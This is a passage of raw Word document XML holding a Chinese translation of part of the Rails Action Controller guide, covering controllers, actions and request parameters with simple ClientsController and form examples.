    </w:p>
    <w:p w14:paraId="7052D2B0"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1 控制器都做什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34698E3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动作控制器是MVC中的C。在路由决定对某次请求使用哪一个控制器之后，该控制器就负责理解该请求并生成相应的输出。幸运的是，动作控制器为你做了大部分的底层工作并且使用了聪明的约定使得这一切尽可能的简明易懂。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5080C92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对于最为常规的 </w:t>
      </w:r>
      <w:hyperlink r:id="rId351" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>RESTful</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 应用，控制器接收请求（对于开发者来说是隐形的），从某一模型中获取或者保存数据，并且使用某一视图创建 HTML 输出。如果需要控制器做一点不同的事情，也不是问题，这里所说只是最为常见的控制器工作的方式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B12DA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控制器因此可以被看作模型和视图之间的中间人。它使得视图可以使用模型的数据，视图就可以显示数据给用户，并且从用户处得到要保存或者更新的数据给到模型。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6331A67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更多关于路由过程的细节，参考"深入浅出道路由":routing.html 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02CB85F0"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2 方法与动作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54DDFAD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控制器是一个继承自 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ApplicationController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 Ruby 类别，和其他类别一样有一些方法。当你的应用接受一个请求时，路由会决定执行哪个控制器和动作， Rails 会创建一个该控制器的实例并且执行与动作名称相同的方法。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5856"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="035A17AB" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="62ECDBD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ClientsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33BB318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new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F68FBF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6997E5D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324AC06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举例来说，如果用户在你的应用中使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/clients/new</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来增加一个新的客户，Rails 会创建一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ClientsController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 实例并执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法。注意上例中的空方法也会正常工作，因为除非动作有另外的指定，Rails会默认渲染 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 视图。通过创建一个新的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Client</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 实例，</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法可以使该视图可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@client</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 实例变量：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3096"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="5CB7824C" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="78C5167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def</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BFC09F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@client</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Client.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F17BCE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070E9247" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="008938C9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId352" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>版型与渲染指南</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对此有更详细的解释。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="550E5A2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ApplicationController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 继承自定义了很多实用方法的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionController::Base</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，本指南会涉及其中一些，但是如果你对都有什么方法感到好奇，你可以自行查看 API 文档或在源码中找到所有的方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A5520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只有公有方法可以被调用为动作。这是一种最佳实践：降低那些本来设计为类似辅助方法或过滤器而不是动作的方法的可见度。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B489170"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3 参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0046A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你很可能会想存取用户或其他参数发来的数据。web 应用中有两种可能的参数。第一种参数是作为URL的一部分被发送来的，叫作查询字符串参数。查询字符串是"?"后的所有东西。第二种参数通常被称为 POST 数据。这些信息通常来自有一个用户填写的 HTML 表单。它被叫作 POST 数据因为它只能作为一个 HTTP POST 请求发送过来。Rails对查询字符串参数和 POST 参数并不做任何区分，在你的控制器中都可以通过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哈希来使用。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8256"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="2B3C8558" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="27A48EF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ClientsController &lt; ActionController::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F0DD9C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此动作使用查询字符串参数因为它通过 HTTP GET 请求运行，</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0168495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但不会造成参数存取方式的任何不同。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18D1478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此动作的 URL 会看起来像要列出所有已激活的</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FB1A1C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用户： /clients?status=activated</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C97C97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index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7619841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if</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>params[:status] == "activated"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BEDF11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@clients</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Client.activated</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02473E8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else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="023575F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@clients</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Client.unactivated</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57FC3B4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027C32B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71B273B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660D25A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此动作使用 POST 参数。他们有很大可能来自于一个用户</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2169FB5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提交的 HTML 表单。此 RESTful 请求的 URL 会为 "/clients"，数据</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79DC0E9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会作为请求主体的一部分被发送。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A29D7A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create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02441A0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@client</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Client.new(params[:client])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09A78D5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if</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@client.save</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7BE6BDD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redirect_to @client</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E0DD38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else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5378213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此行覆盖了默认渲染行为，本来应渲染 "create" 视图。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="429FA9B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render :action</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "new"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="023E2CF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2650D48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05F5369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4BD43AD0"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3.1 哈希与数组参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E1201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params</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 哈希不只局限于一维键值对。它可以包含数组和（嵌套）哈希。通过在键名后附加一对空的方括号可以实现发送一组数组值：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02990D18" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53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6E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>GET /clients?ids[]=1&amp;ids[]=2&amp;ids[]=3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4497F31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此例中实际 URL 会被编码为 “/clients?ids%5b%5d=1&amp;ids%5b%5d=2&amp;ids%5b%5d=3” 因为 “[” 和 “]” 不可出现在 URL 中。大多数时候你都不用担心，因为浏览器会帮你处理它，并且当收到请求后 Rails 会解码回去，但是如果你发现你必须手动发送这些请求到服务器的时候需要留意。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1454802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params[:ids]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的值现在会是 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>["1", "2", "3"]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。注意参数值永远是字符串；Rails不会尝试去猜或是强制转型其类型。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C4889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通过把键名放在方括号中发送一个哈希：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="4E19A26F" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="76B90CC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w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>accept-charset="UTF-8"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>action="/clients"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>method="post"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="342D0FA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name="client[name]"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="Acme"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3FBE6B2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name="client[phone]"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="12345"</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0722CB0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name="client[address][postcode]"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="12345"</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5CD3CD6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type="text"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="client[address][city]"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="Carrot City"</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447B6D3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&lt;/form&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="487952C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当这个表单被提交时，</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
